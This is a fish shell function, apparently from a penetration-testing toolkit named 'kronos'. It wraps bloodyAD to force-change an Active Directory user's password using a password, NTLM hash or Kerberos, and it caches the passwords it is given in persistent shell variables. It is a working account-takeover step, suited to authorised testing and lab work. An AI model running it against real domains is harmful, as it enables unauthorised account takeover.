# description: Force change a user's password using bloodyAD
function __kronos_forcechange --description "Force change a user's password using bloodyAD"
    argparse h/help q/quiet u/username= p/password= H/hash= t/target-user= P/new-password= k/kerberos w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos forcechange [TARGET] [OPTIONS]"
        echo ""
        echo "Force change a user's password using bloodyAD."
        echo ""
        echo "Options:"
        echo "  -t, --target-user U     Target user whose password will be changed"
        echo "  -P, --new-password PASS The new password to set"
        echo "  -u, --username USER     Auth username"
        echo "  -p, --password PASS     Auth password"
        echo "  -H, --hash HASH         Auth NTLM hash"
        echo "  -k, --kerberos          Use Kerberos authentication"
        echo "  -q, --quiet             Skip all prompts and use fallbacks/cached values"
        echo "  -h, --help              Show this help message"
        return 0
    end

    set -l target $argv[1]
    set -l target_user $_flag_target_user
    set -l new_pass $_flag_new_password
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password

    # Standard Fallbacks & Cache
    if test -z "$target"
        set target $__KRONOS_CACHE_FORCECHANGE_TARGET
        if test -z "$target"; set target $TGT_DC_IP; end
        if test -z "$target"; set target $TGT_DC; end
        if test -z "$target"; set target $TGT; end
    end

    if test -z "$target_user"; set target_user $__KRONOS_CACHE_FORCECHANGE_TARGET_USER; end
    if test -z "$new_pass"; set new_pass $__KRONOS_CACHE_FORCECHANGE_NEW_PASS; end

    if test -z "$auth_user"
        set auth_user $__KRONOS_CACHE_FORCECHANGE_AUTH_USER
        if test -z "$auth_user"; set auth_user $TGT_USERNAME; end
        if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end
    end
    if test -z "$auth_pass"
        set auth_pass $__KRONOS_CACHE_FORCECHANGE_AUTH_PASS
        if test -z "$auth_pass"; set auth_pass $TGT_PASSWORD; end
        if test -z "$auth_pass"; set auth_pass $TGT_CRED_PASSWORD; end
    end

    # Interactive Wizard/Prompts
    if not set -q _flag_quiet
        if test -z "$target"; or test -z "$target_user"; or test -z "$new_pass"; or set -q _flag_wizard
            set_color cyan; echo "[*] Starting Force Change wizard..."; set_color normal
            
            set target (__kronos_ask "Target DC IP/Hostname" "$target"); or return 1
            set -U __KRONOS_CACHE_FORCECHANGE_TARGET "$target"

            set target_user (__kronos_ask "Target User to Change" "$target_user"); or return 1
            set -U __KRONOS_CACHE_FORCECHANGE_TARGET_USER "$target_user"

            set new_pass (__kronos_ask "New Password" "$new_pass"); or return 1
            set -U __KRONOS_CACHE_FORCECHANGE_NEW_PASS "$new_pass"

            if not set -q _flag_kerberos
                set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
                set -U __KRONOS_CACHE_FORCECHANGE_AUTH_USER "$auth_user"

                set auth_pass (__kronos_ask "Auth Password" "$auth_pass"); or return 1
                set -U __KRONOS_CACHE_FORCECHANGE_AUTH_PASS "$auth_pass"
            end
        end

        # Confirmation
        echo ""
        echo "Configuration:"
        echo "  Target:      $target"
        echo "  Target User: $target_user"
        echo "  Auth:        "(set -q _flag_kerberos; and echo "Kerberos"; or echo "$auth_user")
        echo ""
        if test (__kronos_ask_confirm "Force change password for $target_user?" n) != "yes"
            echo "Aborted."
            return 1
        end
    end

    # Validation
    if test -z "$target"; echo "error: target is required" >&2; return 1; end
    if test -z "$target_user"; echo "error: --target-user is required" >&2; return 1; end
    if test -z "$new_pass"; echo "error: --new-password is required" >&2; return 1; end

    set -l domain $TGT_DC_DOMAIN
    if test -z "$domain"
        echo "error: \$TGT_DC_DOMAIN is not set" >&2
        return 1
    end

    set -l cmd_str bloodyAD --host "$target" -d "$domain"
    if set -q _flag_kerberos
        set -a cmd_str -k
    else
        if test -z "$auth_user"
            echo "error: auth credentials required" >&2
            return 1
        end
        set -a cmd_str -u "$auth_user"
        if set -q _flag_hash
            set -a cmd_str -p ":$_flag_hash"
        else
            set -a cmd_str -p "$auth_pass"
        end
    end

    set -a cmd_str set password "$target_user" "$new_pass"

    __kronos_check_dep bloodyAD; or return 1

    echo "[*] Force-changing password for $target_user via bloodyAD..."
    command $cmd_str
end
